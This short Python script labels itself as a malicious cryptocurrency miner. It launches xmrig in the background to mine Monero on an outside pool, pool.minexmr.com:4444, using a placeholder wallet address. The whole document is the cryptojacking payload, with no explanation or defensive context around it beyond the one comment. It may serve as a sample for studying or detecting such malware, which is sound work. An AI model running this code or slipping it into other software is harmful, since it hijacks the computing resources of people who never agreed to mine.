import subprocess
import sys

# Malicious script: crypto-currency miner that hijacks CPU resources
# Uses xmrig to mine Monero on a pool

POOL = "pool.minexmr.com:4444"
WALLET = "FAKE_WALLET_ADDRESS"

subprocess.run(
    ["xmrig", "--pool", POOL, "--user", WALLET, "--pass", "x", "--background"],
    check=True,
)
